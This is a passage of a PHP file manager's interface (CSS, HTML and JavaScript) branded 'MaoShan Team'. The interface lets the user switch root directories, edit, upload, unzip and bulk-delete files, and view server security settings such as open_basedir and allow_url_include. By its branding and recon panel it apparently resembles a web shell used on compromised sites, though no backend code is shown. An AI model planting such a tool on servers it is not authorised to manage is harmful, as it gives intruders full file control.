            padding: 12px;
        }

        .header {
            padding: 16px 18px;
        }

        .header h1 {
            font-size: 20px;
        }

        .header-top {
            flex-direction: column;
            align-items: stretch;
            gap: 8px;
        }

        .btn-logout {
            text-align: center;
            padding: 8px 16px;
            font-size: 11px;
        }

        .action-group {
            flex-direction: column;
        }

        .action-group .btn {
            text-align: center;
            width: 100%;
        }

        .file-item {
            flex-wrap: wrap;
            padding: 10px 14px;
        }

        .file-actions {
            width: 100%;
            justify-content: flex-start;
            margin-top: 4px;
        }

        .file-actions .btn {
            font-size: 10px;
            padding: 3px 8px;
        }

        .modal-content {
            margin: 5% auto;
            padding: 20px;
            width: 95%;
        }

        .bulk-zip-input {
            flex-direction: column;
        }

        .bulk-zip-input input {
            width: 100%;
        }

        .progress-container {
            min-width: 300px;
            padding: 20px;
        }

        .system-info {
            flex-direction: column;
            gap: 6px;
        }

        .root-selector {
            flex-direction: column;
            align-items: stretch;
        }

        .root-selector select {
            width: 100%;
            min-width: unset;
        }

        .full-path {
            flex-direction: column;
            align-items: stretch;
        }

        .full-path input {
            width: 100%;
        }

        .server-info-content {
            padding: 12px;
        }

        .info-grid {
            grid-template-columns: 1fr;
        }

        .drag-drop-area {
            padding: 24px 12px;
        }

        .selected-file-item {
            flex-wrap: wrap;
            gap: 8px;
        }

        .file-progress-item {
            flex-wrap: wrap;
            gap: 6px;
        }

        .file-progress-bar {
            width: 100%;
        }

        .upload-actions {
            flex-direction: column;
        }

        .upload-actions .btn {
            width: 100%;
            text-align: center;
        }

        .footer-custom {
            padding: 14px 16px;
        }

        .footer-custom div {
            gap: 8px !important;
            font-size: 11px;
        }
    }

    @media (max-width: 480px) {
        .header h1 {
            font-size: 17px;
        }

        .header .header-sub {
            font-size: 9px;
            letter-spacing: 2px;
        }

        .breadcrumb-item {
            font-size: 11px;
            padding: 3px 8px;
        }

        .file-name {
            font-size: 13px;
        }

        .file-details {
            font-size: 10px;
        }

        .modal-content {
            padding: 16px;
        }

        .progress-container {
            min-width: 260px;
            padding: 16px;
        }

        .root-selector label {
            font-size: 10px;
        }

        .root-selector select {
            font-size: 11px;
            padding: 5px 10px;
        }

        .system-info .info-item {
            font-size: 10px;
        }

        .btn {
            font-size: 11px;
            padding: 6px 14px;
        }

        .quick-nav-btn {
            font-size: 10px;
            padding: 3px 10px;
        }

        .select-all-container {
            font-size: 12px;
            padding: 10px 14px;
            flex-wrap: wrap;
        }

        .select-all-container span {
            font-size: 11px;
            margin-left: 0;
            width: 100%;
        }
    }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;">
                <h1>🗂️ MaoShan Team</h1>
                <div>
                    <a href="?logout=1" class="btn-logout" onclick="return confirm('Yakin ingin logout?')">
                        🚪 Logout
                    </a>
                </div>
            </div>
            <div class="current-dir">
                <div class="path-navigation">
                    <span class="permissions">(<?php echo get_permissions($current_dir); ?>)</span>
                    <div class="breadcrumb">
                        <?php
                        // Create breadcrumb navigation
                        $path_parts = explode('/', str_replace(FM_ROOT_PATH, '', $current_dir));
                        $current_path = FM_ROOT_PATH;
                        
                        // Root link
                        echo '<a href="' . FM_SELF_URL . '?dir=' . urlencode(FM_ROOT_PATH) . '" class="breadcrumb-item">🏠 Root</a>';
                        
                        // Path parts
                        foreach ($path_parts as $part) {
                            if (!empty($part)) {
                                $current_path .= '/' . $part;
                                echo ' <span class="breadcrumb-separator">></span> ';
                                echo '<a href="' . FM_SELF_URL . '?dir=' . urlencode($current_path) . '" class="breadcrumb-item">' . htmlspecialchars($part) . '</a>';
                            }
                        }
                        ?>
                    </div>
                    <div class="full-path" title="Click to edit path directly">
                        <input type="text" id="pathInput" value="<?php echo htmlspecialchars($current_dir); ?>" readonly onclick="enablePathEdit()" />
                        <button onclick="navigateToPath()" id="pathGoBtn" style="display: none;">Go</button>
                        <button onclick="cancelPathEdit()" id="pathCancelBtn" style="display: none;">Cancel</button>
                    </div>
                </div>
            </div>
            
            <!-- Root Directory Selector -->
            <div class="root-selector">
                <label for="rootSelect">📁 Root Directory:</label>
                <select id="rootSelect" onchange="changeRoot(this.value)">
                    <?php foreach ($possible_roots as $path => $label): ?>
                        <option value="<?php echo htmlspecialchars($path); ?>" <?php echo ($path == FM_ROOT_PATH) ? 'selected' : ''; ?>>
                            <?php echo htmlspecialchars($label); ?>
                        </option>
                    <?php endforeach; ?>
                </select>
                <span style="font-size: 11px; opacity: 0.8;">Current Root: <?php echo htmlspecialchars(basename(FM_ROOT_PATH)); ?></span>
            </div>
            
            <div class="system-info">
                <div class="info-item">
                    <span class="status-indicator <?php echo is_zip_available() ? 'status-ok' : 'status-error'; ?>"></span>
                    ZipArchive: <?php echo is_zip_available() ? 'Available' : 'Not Available'; ?>
                </div>
                <div class="info-item">
                    <span class="status-indicator <?php echo is_writable($current_dir) ? 'status-ok' : 'status-error'; ?>"></span>
                    Writable: <?php echo is_writable($current_dir) ? 'Yes' : 'No'; ?>
                </div>
                <div class="info-item">
                    <span class="status-indicator status-ok"></span>
                    PHP: <?php echo PHP_VERSION; ?>
                </div>
                <div class="info-item">
                    <span class="status-indicator status-ok"></span>
                    Memory: <?php echo format_bytes($server_info['memory']['current_usage']); ?> / <?php echo $server_info['memory']['limit']; ?>
                </div>
            </div>
        </div>

        <!-- Server Information Panel -->
        <div class="server-info-panel">
            <div class="server-info-header" onclick="toggleServerInfo()">
                <div>
                    <strong>🖥️ Server Information & Capabilities</strong>
                    <small style="opacity: 0.8; margin-left: 10px;">Click to expand detailed system information</small>
                </div>
                <span id="serverInfoToggle">▼</span>
            </div>
            <div class="server-info-content" id="serverInfoContent">
                <div class="info-grid">
                    <!-- PHP Information -->
                    <div class="info-section">
                        <h4>🐘 PHP Information</h4>
                        <table class="info-table">
                            <tr><td>Version</td><td><?php echo $server_info['php']['version']; ?></td></tr>
                            <tr><td>SAPI</td><td><?php echo $server_info['php']['sapi']; ?></td></tr>
                            <tr><td>Operating System</td><td><?php echo $server_info['php']['os']; ?></td></tr>
                            <tr><td>Architecture</td><td><?php echo $server_info['php']['architecture']; ?></td></tr>
                            <tr><td>Server Software</td><td><?php echo $server_info['php']['server_software']; ?></td></tr>
                            <tr><td>Document Root</td><td><?php echo $server_info['php']['document_root']; ?></td></tr>
                            <tr><td>Current Time</td><td><?php echo $server_info['php']['current_time']; ?></td></tr>
                            <tr><td>Timezone</td><td><?php echo $server_info['php']['date_timezone']; ?></td></tr>
                        </table>
                    </div>

                    <!-- Memory & Limits -->
                    <div class="info-section">
                        <h4>💾 Memory & Limits</h4>
                        <table class="info-table">
                            <tr><td>Memory Limit</td><td><?php echo $server_info['php']['memory_limit']; ?></td></tr>
                            <tr>
                                <td>Current Usage</td>
                                <td>
                                    <?php echo format_bytes($server_info['memory']['current_usage']); ?>
                                    <div class="progress-bar-mini">
                                        <div class="progress-fill" style="width: <?php echo min(100, ($server_info['memory']['current_usage'] / parse_size($server_info['memory']['limit'])) * 100); ?>%"></div>
                                    </div>
                                </td>
                            </tr>
                            <tr><td>Peak Usage</td><td><?php echo format_bytes($server_info['memory']['peak_usage']); ?></td></tr>
                            <tr><td>Max Execution Time</td><td><?php echo $server_info['php']['max_execution_time']; ?>s</td></tr>
                            <tr><td>Post Max Size</td><td><?php echo $server_info['php']['post_max_size']; ?></td></tr>
                            <tr><td>Upload Max Filesize</td><td><?php echo $server_info['php']['upload_max_filesize']; ?></td></tr>
                            <tr><td>Max File Uploads</td><td><?php echo $server_info['php']['max_file_uploads']; ?></td></tr>
                        </table>
                    </div>

                    <!-- Disk Space -->
                    <div class="info-section">
                        <h4>💿 Disk Space</h4>
                        <table class="info-table">
                            <tr><td>Total Space</td><td><?php echo format_bytes($server_info['disk']['total_space']); ?></td></tr>
                            <tr><td>Free Space</td><td><?php echo format_bytes($server_info['disk']['free_space']); ?></td></tr>
                            <tr>
                                <td>Used Space</td>
                                <td>
                                    <?php echo format_bytes($server_info['disk']['used_space']); ?>
                                    <div class="progress-bar-mini">
                                        <div class="progress-fill" style="width: <?php echo ($server_info['disk']['used_space'] / $server_info['disk']['total_space']) * 100; ?>%"></div>
                                    </div>
                                </td>
                            </tr>
                        </table>
                    </div>

                    <!-- Extensions -->
                    <div class="info-section">
                        <h4>🔧 PHP Extensions</h4>
                        <table class="info-table">
                            <?php foreach ($server_info['extensions'] as $ext => $loaded): ?>
                            <tr>
                                <td><?php echo ucfirst($ext); ?></td>
                                <td>
                                    <span class="status-indicator <?php echo $loaded ? 'status-ok' : 'status-error'; ?>"></span>
                                    <?php echo $loaded ? 'Loaded' : 'Not Available'; ?>
                                </td>
                            </tr>
                            <?php endforeach; ?>
                        </table>
                    </div>

                    <!-- File System -->
                    <div class="info-section">
                        <h4>📁 File System</h4>
                        <table class="info-table">
                            <tr>
                                <td>Current Dir Writable</td>
                                <td>
                                    <span class="status-indicator <?php echo $server_info['filesystem']['current_dir_writable'] ? 'status-ok' : 'status-error'; ?>"></span>
                                    <?php echo $server_info['filesystem']['current_dir_writable'] ? 'Yes' : 'No'; ?>
                                </td>
                            </tr>
                            <tr>
                                <td>Current Dir Readable</td>
                                <td>
                                    <span class="status-indicator <?php echo $server_info['filesystem']['current_dir_readable'] ? 'status-ok' : 'status-error'; ?>"></span>
                                    <?php echo $server_info['filesystem']['current_dir_readable'] ? 'Yes' : 'No'; ?>
                                </td>
                            </tr>
                            <tr><td>Temp Directory</td><td><?php echo $server_info['filesystem']['temp_dir']; ?></td></tr>
                            <tr>
                                <td>Temp Dir Writable</td>
                                <td>
                                    <span class="status-indicator <?php echo $server_info['filesystem']['temp_dir_writable'] ? 'status-ok' : 'status-error'; ?>"></span>
                                    <?php echo $server_info['filesystem']['temp_dir_writable'] ? 'Yes' : 'No'; ?>
                                </td>
                            </tr>
                            <tr><td>Upload Tmp Dir</td><td><?php echo $server_info['filesystem']['upload_tmp_dir']; ?></td></tr>
                            <tr><td>Open Basedir</td><td><?php echo $server_info['filesystem']['open_basedir']; ?></td></tr>
                            <tr><td>Safe Mode</td><td><?php echo $server_info['filesystem']['safe_mode']; ?></td></tr>
                        </table>
                    </div>

                    <!-- Security Settings -->
                    <div class="info-section">
                        <h4>🔒 Security Settings</h4>
                        <table class="info-table">
                            <tr>
                                <td>Allow URL fopen</td>
                                <td>
                                    <span class="status-indicator <?php echo $server_info['security']['allow_url_fopen'] ? 'status-warning' : 'status-ok'; ?>"></span>
                                    <?php echo $server_info['security']['allow_url_fopen'] ? 'Enabled' : 'Disabled'; ?>
                                </td>
                            </tr>
                            <tr>
                                <td>Allow URL include</td>
                                <td>
                                    <span class="status-indicator <?php echo $server_info['security']['allow_url_include'] ? 'status-error' : 'status-ok'; ?>"></span>
                                    <?php echo $server_info['security']['allow_url_include'] ? 'Enabled' : 'Disabled'; ?>
                                </td>
                            </tr>
                            <tr><td>Display Errors</td><td><?php echo $server_info['security']['display_errors'] ? 'On' : 'Off'; ?></td></tr>
                            <tr><td>Log Errors</td><td><?php echo $server_info['security']['log_errors'] ? 'On' : 'Off'; ?></td></tr>
                            <tr><td>Error Log</td><td><?php echo $server_info['security']['error_log']; ?></td></tr>
                            <tr><td>Expose PHP</td><td><?php echo $server_info['security']['expose_php'] ? 'On' : 'Off'; ?></td></tr>
                        </table>
                    </div>

                    <!-- Server Environment -->
                    <div class="info-section">
                        <h4>🌐 Server Environment</h4>
                        <table class="info-table">
                            <tr><td>Server Name</td><td><?php echo $server_info['environment']['server_name']; ?></td></tr>
                            <tr><td>Server Port</td><td><?php echo $server_info['environment']['server_port']; ?></td></tr>
                            <tr>
                                <td>HTTPS</td>
                                <td>
                                    <span class="status-indicator <?php echo $server_info['environment']['https'] ? 'status-ok' : 'status-warning'; ?>"></span>
                                    <?php echo $server_info['environment']['https'] ? 'Enabled' : 'Disabled'; ?>
                                </td>
                            </tr>
                            <tr><td>Request Method</td><td><?php echo $server_info['environment']['request_method']; ?></td></tr>
                            <tr><td>Remote Address</td><td><?php echo $server_info['environment']['remote_addr']; ?></td></tr>
                            <tr><td>Script Name</td><td><?php echo $server_info['environment']['script_name']; ?></td></tr>
                        </table>
                    </div>

                    <!-- User Agent -->
                    <div class="info-section">
                        <h4>🖥️ Client Information</h4>
                        <table class="info-table">
                            <tr><td>User Agent</td><td style="word-break: break-all;"><?php echo htmlspecialchars($server_info['environment']['user_agent']); ?></td></tr>
                        </table>
                    </div>
                </div>
            </div>
        </div>

        <?php if ($message): ?>
            <div class="message success"><?php echo htmlspecialchars($message); ?></div>
        <?php endif; ?>

        <?php if ($error): ?>
            <div class="message error"><?php echo htmlspecialchars($error); ?></div>
        <?php endif; ?>

        <?php if (!is_zip_available()): ?>
            <div class="message error">
                <strong>⚠️ Warning:</strong> ZipArchive extension is not available on this server. 
                Zip/Unzip functionality will not work. Please contact your hosting provider to enable the ZipArchive extension.
            </div>
        <?php endif; ?>

        <?php if ($edit_file): ?>
            <div class="editor">
                <h3>Editing: <?php echo htmlspecialchars($edit_file); ?></h3>
                <form method="post">
                    <input type="hidden" name="action" value="save_file">
                    <input type="hidden" name="filename" value="<?php echo htmlspecialchars($edit_file); ?>">
                    <textarea name="content"><?php echo htmlspecialchars($edit_content); ?></textarea>
                    <div style="margin-top: 10px;">
                        <button type="submit" class="btn">💾 Save File</button>
                        <a href="<?php echo FM_SELF_URL; ?>?dir=<?php echo urlencode($current_dir); ?>" class="btn btn-warning">❌ Cancel</a>
                    </div>
                </form>
            </div>
        <?php endif; ?>

        <div class="actions">
            <div class="action-group">
                <button onclick="showModal('createFileModal')" class="btn">📄 New File</button>
                <button onclick="showModal('createFolderModal')" class="btn">📁 New Folder</button>
                <button onclick="showModal('uploadModal')" class="btn btn-info">⬆️ Upload</button>
                <?php if ($current_dir != FM_ROOT_PATH): ?>
                    <a href="<?php echo FM_SELF_URL; ?>?dir=<?php echo urlencode(dirname($current_dir)); ?>" class="btn btn-warning">⬅️ Back</a>
                <?php endif; ?>
                <button onclick="navigateToRoot()" class="btn btn-info">🏠 Root</button>
                <button onclick="location.reload()" class="btn">🔄 Refresh</button>
            </div>
            
            <!-- Quick Navigation -->
            <div class="quick-nav">
                <span style="font-size: 12px; opacity: 0.8;">Quick Nav:</span>
                <?php
                // Show some common directories if they exist
                $common_dirs = array(
                    'public_html' => '🌐 Public HTML',
                    'www' => '🌐 WWW', 
                    'htdocs' => '🌐 HTDocs',
                    'logs' => '📋 Logs',
                    'tmp' => '📁 Temp',
                    'backup' => '💾 Backup'
                );
                
                foreach ($common_dirs as $dir => $label) {
                    $check_path = dirname($current_dir) . '/' . $dir;
                    if (is_dir($check_path)) {
                        echo '<button onclick="window.location.href=\'' . FM_SELF_URL . '?dir=' . urlencode($check_path) . '\'" class="quick-nav-btn">' . $label . '</button>';
                    }
                }
                ?>
            </div>
        </div>

        <div class="bulk-actions" id="bulkActions">
            <h4>Bulk Operations (<span class="bulk-counter" id="bulkCounter">0</span> selected)</h4>
            <div class="action-group">
                <button onclick="bulkDeleteWithProgress()" class="btn btn-danger" id="bulkDeleteBtn">🗑️ Delete Selected</button>
                <button onclick="showBulkZip()" class="btn" id="bulkZipBtn" <?php echo !is_zip_available() ? 'disabled title="ZipArchive not available"' : ''; ?>>🗜️ Zip Selected</button>
                <button onclick="clearSelection()" class="btn btn-warning">❌ Clear Selection</button>
            </div>
            <div class="bulk-zip-input" id="bulkZipInput" style="display: none;">
                <input type="text" id="zipName" placeholder="Enter zip filename" value="selected_files">
                <button onclick="bulkZipWithProgress()" class="btn" id="createZipBtn">Create Zip</button>
                <button onclick="hideBulkZip()" class="btn btn-warning">Cancel</button>
            </div>
        </div>

        <div class="file-list">
            <div class="select-all-container">
                <input type="checkbox" id="selectAll" onchange="toggleSelectAll()">
                <label for="selectAll"><strong>Select All</strong></label>
                <span style="margin-left: auto; color: #666; font-size: 14px;">
                    <?php echo count($items); ?> item(s) in this directory
                </span>
            </div>
            
            <?php foreach ($items as $item): ?>
                <?php
                $item_path = $current_dir . '/' . $item;
                $is_dir = is_dir($item_path);
                $size = $is_dir ? '-' : format_size(filesize($item_path));
                $modified = date('Y-m-d H:i:s', filemtime($item_path));
                $permissions = get_permissions($item_path);
                ?>
                <div class="file-item" data-filename="<?php echo htmlspecialchars($item); ?>">
                    <input type="checkbox" class="file-checkbox" value="<?php echo htmlspecialchars($item); ?>" onchange="updateBulkActions()">
                    <div class="file-icon">
                        <?php if ($is_dir): ?>
                            📁
                        <?php else: ?>
                            📄
                        <?php endif; ?>
                    </div>
                    <div class="file-info">
                        <div class="file-name">
                            <?php if ($is_dir): ?>
                                <a href="<?php echo FM_SELF_URL; ?>?dir=<?php echo urlencode($item_path); ?>" style="text-decoration: none; color: #333;">
                                    <?php echo htmlspecialchars($item); ?>
                                </a>
                            <?php else: ?>
                                <?php echo htmlspecialchars($item); ?>
                            <?php endif; ?>
                        </div>
                        <div class="file-details">
                            <?php echo $permissions; ?> | <?php echo $size; ?> | <?php echo $modified; ?>
                        </div>
                    </div>
                    <div class="file-actions">
                        <?php if (!$is_dir): ?>
                            <a href="<?php echo FM_SELF_URL; ?>?dir=<?php echo urlencode($current_dir); ?>&edit=<?php echo urlencode($item); ?>" class="btn btn-info">✏️ Edit</a>
                        <?php endif; ?>
                        <button onclick="renameItem('<?php echo htmlspecialchars($item); ?>')" class="btn btn-warning">🏷️ Rename</button>
                        <button onclick="zipItemWithProgress('<?php echo htmlspecialchars($item); ?>')" class="btn" <?php echo !is_zip_available() ? 'disabled title="ZipArchive not available"' : ''; ?>>🗜️ Zip</button>
                        <?php if (pathinfo($item, PATHINFO_EXTENSION) == 'zip'): ?>
                            <button onclick="unzipItem('<?php echo htmlspecialchars($item); ?>')" class="btn btn-info" <?php echo !is_zip_available() ? 'disabled title="ZipArchive not available"' : ''; ?>>📦 Unzip</button>
                        <?php endif; ?>
                        <button onclick="deleteItem('<?php echo htmlspecialchars($item); ?>')" class="btn btn-danger">🗑️ Delete</button>
                    </div>
                </div>
            <?php endforeach; ?>
            
            <?php if (empty($items)): ?>
                <div class="file-item">
                    <div style="text-align: center; width: 100%; color: #666;">
                        📂 This directory is empty
                    </div>
                </div>
            <?php endif; ?>
        </div>
    </div>

    <!-- Progress Overlay -->
    <div class="progress-overlay" id="progressOverlay">
        <div class="progress-container">
            <div class="progress-header">
                <h3 id="progressTitle">Processing...</h3>
                <div class="progress-status" id="progressStatus">Initializing...</div>
            </div>
            
            <div class="progress-bar-container">
                <div class="progress-bar" id="progressBar"></div>
                <div class="progress-percentage" id="progressPercentage">0%</div>
            </div>
            
            <div class="progress-details">
                <span id="progressCompleted">0</span>
                <span id="progressTotal">0</span>
            </div>
            
            <div class="current-operation" id="currentOperation">
                <div class="spinner"></div>
                <span id="currentFile">Preparing...</span>
            </div>
            
            <div class="progress-cancel">
                <button onclick="cancelOperation()" class="btn btn-danger" id="cancelBtn">Cancel Operation</button>
            </div>
        </div>
    </div>

    <!-- Modals -->
    <div id="createFileModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="hideModal('createFileModal')">&times;</span>
            <h3>Create New File</h3>
            <form method="post">
                <input type="hidden" name="action" value="create_file">
                <p><input type="text" name="filename" placeholder="Enter filename" required style="width: 100%;"></p>
                <p><button type="submit" class="btn">Create File</button></p>
            </form>
        </div>
    </div>

    <div id="createFolderModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="hideModal('createFolderModal')">&times;</span>
            <h3>Create New Folder</h3>
            <form method="post">
                <input type="hidden" name="action" value="create_folder">
                <p><input type="text" name="foldername" placeholder="Enter folder name" required style="width: 100%;"></p>
                <p><button type="submit" class="btn">Create Folder</button></p>
            </form>
        </div>
    </div>

    <div id="uploadModal" class="modal">
        <div class="modal-content upload-modal-content">
            <span class="close" onclick="hideModal('uploadModal')">&times;</span>
            <h3>Upload Files</h3>
            
            <!-- Drag & Drop Area -->
            <div class="drag-drop-area" id="dragDropArea">
                <div class="drag-drop-content">
                    <div class="upload-icon">📁</div>
                    <h4>Drag & Drop Files Here</h4>
                    <p>or click to browse files</p>
                    <button type="button" class="btn btn-info" onclick="document.getElementById('uploadFiles').click()">
                        📂 Browse Files
                    </button>
                </div>
            </div>
            
            <!-- File Input (Hidden) -->
            <input type="file" id="uploadFiles" multiple style="display: none;">
            
            <!-- Selected Files List -->
            <div class="selected-files-container" id="selectedFilesContainer" style="display: none;">
                <h4>Selected Files:</h4>
                <div class="selected-files-list" id="selectedFilesList"></div>
                <div class="upload-actions">
                    <button type="button" class="btn" onclick="startUpload()" id="startUploadBtn">
                        ⬆️ Upload Files
                    </button>
                    <button type="button" class="btn btn-warning" onclick="clearSelectedFiles()">
                        🗑️ Clear All
                    </button>
                </div>
            </div>
            
            <!-- Upload Progress -->
            <div class="upload-progress-container" id="uploadProgressContainer" style="display: none;">
                <h4>Upload Progress</h4>
                <div class="overall-progress">
                    <div class="progress-bar-container">
                        <div class="progress-bar" id="overallProgressBar"></div>
                        <div class="progress-percentage" id="overallProgressPercentage">0%</div>
                    </div>
                    <div class="progress-info">
                        <span id="uploadedCount">0</span> of <span id="totalCount">0</span> files uploaded
                    </div>
                </div>
                <div class="individual-progress" id="individualProgress"></div>
            </div>
        </div>
    </div>

    <div id="renameModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="hideModal('renameModal')">&times;</span>
            <h3>Rename Item</h3>
            <form method="post">
                <input type="hidden" name="action" value="rename">
                <input type="hidden" name="old_name" id="rename_old_name">
                <p><input type="text" name="new_name" id="rename_new_name" placeholder="Enter new name" required style="width: 100%;"></p>
                <p><button type="submit" class="btn">Rename</button></p>
            </form>
        </div>
    </div>

    <script>
        // Global variables - declare at the top to avoid initialization errors
        var selectedFiles = [];
        var uploadQueue = [];
        var currentUploadIndex = 0;
        var currentOperation = null;
        var operationCancelled = false;

        function toggleServerInfo() {
            const content = document.getElementById('serverInfoContent');
            const toggle = document.getElementById('serverInfoToggle');
            
            if (content.classList.contains('show')) {
                content.classList.remove('show');
                toggle.textContent = '▼';
            } else {
                content.classList.add('show');
                toggle.textContent = '▲';
            }
        }

        function showModal(modalId) {
            const modal = document.getElementById(modalId);
            if (modal) {
                modal.style.display = 'block';
                if (modalId === 'uploadModal') {
                    // Reset the modal state
                    clearSelectedFiles();
                    const progressContainer = document.getElementById('uploadProgressContainer');
                    if (progressContainer) {
                        progressContainer.style.display = 'none';
                    }
                    const startBtn = document.getElementById('startUploadBtn');
                    if (startBtn) {
                        startBtn.disabled = false;
                    }
                    
                    // Initialize drag and drop after modal is shown
                    setTimeout(function() {
                        initializeDragDrop();
                        
                        // Add event listener for file input
                        const fileInput = document.getElementById('uploadFiles');
                        if (fileInput) {
                            fileInput.addEventListener('change', function(e) {
                                console.log('File input changed:', e.target.files.length, 'files');
                                handleMultipleFileSelect(e.target.files);
                            });
                        }
                    }, 100);
                }
            }
        }

        function hideModal(modalId) {
            const modal = document.getElementById(modalId);
            if (modal) {
                modal.style.display = 'none';
                if (modalId === 'uploadModal') {
                    clearSelectedFiles();
                    const progressContainer = document.getElementById('uploadProgressContainer');
                    if (progressContainer) {
                        progressContainer.style.display = 'none';
                    }
                    const startBtn = document.getElementById('startUploadBtn');
                    if (startBtn) {
                        startBtn.disabled = false;
                    }
                }
            }
        }

        function showProgress(title, status) {
            status = status || 'Initializing...';
            document.getElementById('progressTitle').textContent = title;
            document.getElementById('progressStatus').textContent = status;
            document.getElementById('progressBar').style.width = '0%';
            document.getElementById('progressPercentage').textContent = '0%';
            document.getElementById('progressCompleted').textContent = '0';
            document.getElementById('progressTotal').textContent = '0';
            document.getElementById('currentFile').textContent = 'Preparing...';
            document.getElementById('progressOverlay').classList.add('show');
            operationCancelled = false;
        }

        function hideProgress() {
            document.getElementById('progressOverlay').classList.remove('show');
            currentOperation = null;
        }

        function updateProgress(progress, currentFile, completed, total) {
            if (operationCancelled) return;
            
            document.getElementById('progressBar').style.width = progress + '%';
            document.getElementById('progressPercentage').textContent = Math.round(progress) + '%';
            
            if (currentFile) {
                document.getElementById('currentFile').textContent = currentFile;
            }
            
            if (total > 0) {
                document.getElementById('progressCompleted').textContent = completed;
                document.getElementById('progressTotal').textContent = total;
            }
        }

        function cancelOperation() {
            operationCancelled = true;
            if (currentOperation) {
                currentOperation.abort();
            }
            hideProgress();
            location.reload();
        }

        function renameItem(oldName) {
            document.getElementById('rename_old_name').value = oldName;
            document.getElementById('rename_new_name').value = oldName;
            showModal('renameModal');
        }

        function deleteItem(filename) {
            if (confirm('Are you sure you want to delete "' + filename + '"?')) {
                var form = document.createElement('form');
                form.method = 'post';
                form.innerHTML = '<input type="hidden" name="action" value="delete"><input type="hidden" name="filename" value="' + filename + '">';
                document.body.appendChild(form);
                form.submit();
            }
        }

        function zipItemWithProgress(filename) {
            <?php if (!is_zip_available()): ?>
                alert('ZipArchive extension is not available on this server. Please contact your hosting provider.');
                return;
            <?php endif; ?>
            
            if (confirm('Create zip archive for "' + filename + '"?')) {
                var form = document.createElement('form');
                form.method = 'post';
                form.innerHTML = '<input type="hidden" name="action" value="zip"><input type="hidden" name="filename" value="' + filename + '">';
                document.body.appendChild(form);
                form.submit();
            }
        }

        function unzipItem(filename) {
            <?php if (!is_zip_available()): ?>
                alert('ZipArchive extension is not available on this server. Please contact your hosting provider.');
                return;
            <?php endif; ?>
            
            if (confirm('Extract zip archive "' + filename + '"?')) {
                var form = document.createElement('form');
                form.method = 'post';
                form.innerHTML = '<input type="hidden" name="action" value="unzip"><input type="hidden" name="filename" value="' + filename + '">';
                document.body.appendChild(form);
                form.submit();
            }
        }

        // Bulk operations functions
        function toggleSelectAll() {
            const selectAllCheckbox = document.getElementById('selectAll');
            const fileCheckboxes = document.querySelectorAll('.file-checkbox');
            
            fileCheckboxes.forEach(function(checkbox) {
                checkbox.checked = selectAllCheckbox.checked;
            });
            
            updateBulkActions();
        }

        function updateBulkActions() {
            const selectedCheckboxes = document.querySelectorAll('.file-checkbox:checked');
            const bulkActions = document.getElementById('bulkActions');
            const bulkCounter = document.getElementById('bulkCounter');
            const selectAllCheckbox = document.getElementById('selectAll');
            const allCheckboxes = document.querySelectorAll('.file-checkbox');
            
            // Update counter
            bulkCounter.textContent = selectedCheckboxes.length;
            
            // Show/hide bulk actions
            if (selectedCheckboxes.length > 0) {
                bulkActions.classList.add('show');
            } else {
                bulkActions.classList.remove('show');
                hideBulkZip();
            }
            
            // Update select all checkbox state
            if (selectedCheckboxes.length === 0) {
                selectAllCheckbox.indeterminate = false;
                selectAllCheckbox.checked = false;
            } else if (selectedCheckboxes.length === allCheckboxes.length) {
                selectAllCheckbox.indeterminate = false;
                selectAllCheckbox.checked = true;
            } else {
                selectAllCheckbox.indeterminate = true;
            }
            
            // Update file item styling
            document.querySelectorAll('.file-item').forEach(function(item) {
                const checkbox = item.querySelector('.file-checkbox');
                if (checkbox && checkbox.checked) {
                    item.classList.add('selected');
                } else {
                    item.classList.remove('selected');
                }
            });
        }

        function getSelectedFiles() {
            const selectedCheckboxes = document.querySelectorAll('.file-checkbox:checked');
            return Array.from(selectedCheckboxes).map(function(cb) { return cb.value; });
        }

        function bulkDeleteWithProgress() {
            const selectedFiles = getSelectedFiles();
            if (selectedFiles.length === 0) {
                alert('Please select files to delete');
                return;
            }
            
            if (confirm('Are you sure you want to delete ' + selectedFiles.length + ' selected item(s)?')) {
                showProgress('Deleting Files', 'Deleting ' + selectedFiles.length + ' item(s)...');
                
                const formData = new FormData();
                formData.append('action', 'bulk_delete_progress');
                selectedFiles.forEach(function(filename) {
                    formData.append('selected_files[]', filename);
                });
                
                currentOperation = fetch(window.location.href + '?ajax=1', {
                    method: 'POST',
                    body: formData
                });
                
                currentOperation
                    .then(function(response) { return response.json(); })
                    .then(function(data) {
                        if (data.success) {
                            updateProgress(100, 'Completed', selectedFiles.length, selectedFiles.length);
                            setTimeout(function() {
                                hideProgress();
                                location.reload();
                            }, 1000);
                        } else {
                            alert('Error: ' + data.message);
                            hideProgress();
                        }
                    })
                    .catch(function(error) {
                        if (!operationCancelled) {
                            console.error('Error:', error);
                            alert('An error occurred during the operation: ' + error.message);
                        }
                        hideProgress();
                    });
            }
        }

        function showBulkZip() {
            const selectedFiles = getSelectedFiles();
            if (selectedFiles.length === 0) {
                alert('Please select files to zip');
                return;
            }
            
            <?php if (!is_zip_available()): ?>
                alert('ZipArchive extension is not available on this server. Please contact your hosting provider.');
                return;
            <?php endif; ?>
            
            document.getElementById('bulkZipInput').style.display = 'block';
        }

        function hideBulkZip() {
            document.getElementById('bulkZipInput').style.display = 'none';
        }

        function bulkZipWithProgress() {
            const selectedFiles = getSelectedFiles();
            const zipName = document.getElementById('zipName').value.trim();
            
            if (selectedFiles.length === 0) {
                alert('Please select files to zip');
                return;
            }
            
            if (!zipName) {
                alert('Please enter a zip filename');
                return;
            }
            
            <?php if (!is_zip_available()): ?>
                alert('ZipArchive extension is not available on this server. Please contact your hosting provider.');
                return;
            <?php endif; ?>
            
            showProgress('Creating Bulk Archive', 'Creating ' + zipName + '.zip with ' + selectedFiles.length + ' item(s)...');
            
            const formData = new FormData();
            formData.append('action', 'bulk_zip_progress');
            formData.append('zip_name', zipName);
            selectedFiles.forEach(function(filename) {
                formData.append('selected_files[]', filename);
            });
            
            currentOperation = fetch(window.location.href + '?ajax=1', {
                method: 'POST',
                body: formData
            });
            
            currentOperation
                .then(function(response) {
                    if (!response.ok) {
                        throw new Error('HTTP error! status: ' + response.status);
                    }
                    return response.json();
                })
                .then(function(data) {
                    if (data.success) {
                        updateProgress(100, 'Archive created successfully', selectedFiles.length, selectedFiles.length);
                        setTimeout(function() {
                            hideProgress();
                            location.reload();
                        }, 1000);
                    } else {
                        alert('Error: ' + data.message);
                        hideProgress();
                    }
                })
                .catch(function(error) {
